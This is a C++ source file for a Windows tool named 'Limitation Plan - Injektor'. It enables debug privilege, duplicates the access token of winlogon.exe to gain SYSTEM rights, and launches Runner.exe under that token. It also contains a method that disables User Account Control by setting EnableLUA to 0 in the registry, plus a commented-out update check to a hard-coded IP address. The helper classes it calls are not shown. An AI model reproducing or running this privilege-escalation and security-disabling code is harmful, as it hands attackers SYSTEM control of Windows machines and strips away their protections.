#include <iostream>
#include <iomanip>
#include <ctime>

//#include <json/json.h>
//#include "httplib.h"
#include "RegManage.h"
#include "WINAPICaller.h"
#include "WINAPIDllFunc.h"
#include "UpdateChecker.h"

using std::string;
using std::cout;
using std::wcout;
using std::endl;
using std::hex;

//using httplib::Result;
//using httplib::Client;
//using httplib::Params;
//using httplib::Headers;


class Application {
public:
	Application() {
		this->ProgVersion = 8;
		this->caller = WINAPICaller();
		this->ServerAvailable = FALSE;
	}

	LRESULT cancelUACBox() {
		RegManage manage = RegManage(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"));
		LRESULT res = manage.setDword(TEXT("EnableLUA"), 0);
		return res;
	}
	
	void run() {
		cout << "Limitation Plan - Injektor" << endl;
		cout << "Program Version: " << this->ProgVersion << endl << endl;
		this->caller.AdjustCurrentPrivilege(SE_DEBUG_NAME);

		cout << "Checking update....    ";

		//DWORD cres = this->checkUpdate();
		//if (cres == -1) {
		//	cout << "FAIL! Will not able to connect to Server.";
		//} else if(cres > this->ProgVersion) {
		//	cout << endl << "Has newer version:" << cres << ",Go to update mode...";
		//}
		//else {
		//	cout << "LATEST!";
		//}

		cout << endl;
		cout << "Start injekting..." << endl;
		DWORD procSessId = this->caller.getProcessSessionId(TEXT("winlogon.exe"));
		cout << "Found WINLOGON.exe's MID:" << procSessId << endl;
		HANDLE target;

		cout << "STARTING to get SYSTEM Privilege,please wait..." << endl;
		DWORD res = this->caller.DuplicateProcessToken(procSessId, &target);

		cout << "STARTING to run Runner.exe,please wait..." << endl;
		DWORD c = this->caller.WCreateProcessWithToken(target, L"Runner.exe");

		cout << "Completed.Now Injektor will quit soon." << endl;
	}

	//DWORD checkUpdate() {
	//	string url = "http://121.4.255.82:5001/checkUpdate";
	//	Client c = Client(url.c_str());

	//	Headers head;
	//	head.emplace("Content-Type", "application/json;charset=utf-8");
	//	c.set_default_headers(head);

	//	Params p;
	//	p.emplace("version", this->ProgVersion);
	//	p.emplace("timestamp", uint32_t(time(NULL)));
	//	
	//	Result res = c.Post(url.c_str());
	//	if (res->status != 200) return -1;

	//	try {
	//		Json::Value v = Json::Value(res->body);
	//		if (!(v["code"].asInt() == 200)) return -1;
	//		if (!v["data"].isMember("latest")) return -1;
	//		if (!v["data"].isMember("timestamp")) return -1;
	//		if (!v["data"].isMember("verifyCode")) return -1;
	//		return v["latest"].asInt();
	//	}
	//	catch (const char* msg){
	//		return -1;
	//	}
	//}
private:
	DWORD ProgVersion;
	WINAPICaller caller;
	UpdateChecker checker;
	BOOL ServerAvailable;

};

Application app;

int main() {
	app.run();
	return 0;
}